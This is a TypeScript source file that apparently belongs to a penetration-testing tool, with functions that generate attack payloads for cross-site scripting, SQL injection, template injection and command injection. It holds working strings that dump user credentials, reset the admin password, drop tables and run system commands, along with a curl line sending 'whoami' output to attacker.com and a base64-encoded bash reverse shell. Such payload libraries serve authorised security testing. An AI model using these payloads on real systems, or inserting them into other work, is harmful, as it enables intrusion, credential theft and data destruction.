/**
 * XSS Payload generators
 */
export function generateBasicXSSPayloads(variant: string, parameter?: string): string[] {
  const payloads: string[] = [];
  
  switch (variant) {
    case "basic":
      payloads.push(
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(document.domain)</script>"
      );
      break;
      
    case "img":
      payloads.push(
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=1 href=1 onerror=\"javascript:alert(document.cookie)\">"
      );
      break;
      
    case "svg":
      payloads.push(
        "<svg onload=alert('XSS')>",
        "<svg/onload=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>"
      );
      break;
      
    case "event":
      payloads.push(
        "<body onload=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "<iframe onload=alert('XSS')></iframe>"
      );
      break;
      
    case "dom":
      payloads.push(
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "<a href=\"#\" onclick=\"alert('XSS')\">Click me</a>",
        "javascript:alert(document.domain)"
      );
      break;
      
    case "bypass":
      payloads.push(
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
        "<script>throw~delete~typeof~prompt(1)</script>"
      );
      break;
      
    default:
      payloads.push(
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
      );
  }
  
  // Add parameter-specific payloads if provided
  if (parameter) {
    payloads.push(
      `"><script>alert('${parameter}')</script>`,
      `javascript:void(document.getElementsByName('${parameter}')[0].value='hacked')`
    );
  }
  
  return payloads;
}

/**
 * SQL Injection Payload generators
 */
export function generateSQLiPayloads(variant: string, parameter?: string): string[] {
  const payloads: string[] = [];
  
  switch (variant) {
    case "union":
      payloads.push(
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT username,password,3 FROM users-- -",
        "') UNION SELECT table_name,2,3 FROM information_schema.tables-- -"
      );
      break;
      
    case "error":
      payloads.push(
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- -",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND updatexml(1,concat(0x7e,(select version()),0x7e),1)-- -"
      );
      break;
      
    case "blind":
      payloads.push(
        "' AND (SELECT SUBSTR(version(),1,1)) = '5'-- -",
        "' AND IF(version() LIKE '5%',SLEEP(5),1)-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
      );
      break;
      
    case "time":
      payloads.push(
        "' AND SLEEP(5)-- -",
        "' AND BENCHMARK(5000000,MD5('a'))-- -",
        "' OR IF(SUBSTRING(username,1,1)='a',SLEEP(5),1) FROM users-- -"
      );
      break;
      
    case "stacked":
      payloads.push(
        "'; INSERT INTO users (username,password) VALUES ('hacker','password')-- -",
        "'; UPDATE users SET password='hacked' WHERE username='admin'-- -",
        "'; DROP TABLE users-- -"
      );
      break;
      
    default:
      payloads.push(
        "' OR 1=1-- -",
        "admin' -- -",
        "' OR '1'='1"
      );
  }
  
  // Add parameter-specific payloads if provided
  if (parameter) {
    if (parameter.match(/^\d+$/)) {
      // If parameter is a number (like column count)
      const count = parseInt(parameter);
      payloads.push(
        `' UNION SELECT ${Array(count).fill(0).map((_, i) => i + 1).join(',')}-- -`
      );
    } else {
      // Parameter is a string (like table name)
      payloads.push(
        `' AND EXISTS (SELECT * FROM ${parameter})-- -`,
        `' UNION SELECT * FROM ${parameter}-- -`
      );
    }
  }
  
  return payloads;
}

/**
 * Template Injection Payload generators
 */
export function generateTemplateInjectionPayloads(variant: string, parameter?: string): string[] {
  const payloads: string[] = [];
  
  switch (variant) {
    case "jinja2":
      payloads.push(
        "{{ 7*7 }}",
        "{{ config.items() }}",
        "{{ self.__init__.__globals__.__builtins__ }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}"
      );
      break;
      
    case "twig":
      payloads.push(
        "{{7*7}}",
        "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
        "{% set commands = ['id', 'whoami'] %}{{ commands|join(' && ') }}"
      );
      break;
      
    case "velocity":
      payloads.push(
        "#set($x=1+1)${x}",
        "#set($cmd='whoami')#set($ex=$cmd.class.forName('java.lang.Runtime').getRuntime().exec($cmd))",
        "#set($str=$class.inspect('java.lang.String').type)#set($chr=$class.inspect('java.lang.Character').type)"
      );
      break;
      
    case "freemarker":
      payloads.push(
        "${7*7}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${\"freemarker.template.utility.Execute\"?new()('id')}"
      );
      break;
      
    default:
      payloads.push(
        "{{ 7*7 }}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}"
      );
  }
  
  return payloads;
}

/**
 * Command Injection Payload generators
 */
export function generateCommandInjectionPayloads(variant: string): string[] {
  const payloads: string[] = [];
  
  switch (variant) {
    case "basic":
      payloads.push(
        "; id",
        "& whoami",
        "| cat /etc/passwd",
        "; ls -la"
      );
      break;
      
    case "blind":
      payloads.push(
        "; ping -c 5 attacker.com",
        "& nslookup myserver.attacker.com",
        "| curl http://attacker.com/$(whoami)"
      );
      break;
      
    case "bypass":
      payloads.push(
        "$(id)",
        "`id`",
        "$({cat,/etc/passwd})",
        "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"
      );
      break;
      
    default:
      payloads.push(
        "; id",
        "& whoami",
        "| ls -la",
        "`cat /etc/passwd`"
      );
  }
  
  return payloads;
}
